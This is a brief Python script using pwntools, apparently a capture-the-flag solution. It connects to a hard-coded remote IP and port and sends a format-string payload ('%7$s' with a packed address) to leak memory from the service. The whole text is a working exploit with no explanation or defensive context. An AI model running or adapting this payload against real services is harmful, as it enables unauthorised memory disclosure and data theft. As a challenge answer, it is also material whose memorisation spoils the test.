
from pwn import *
io = remote("109.233.56.90", 11657)
payload = b"%7$s".ljust(8, b"A") + p64(0x4040a0)
io.sendline(payload)
print(io.recvall(timeout=2))
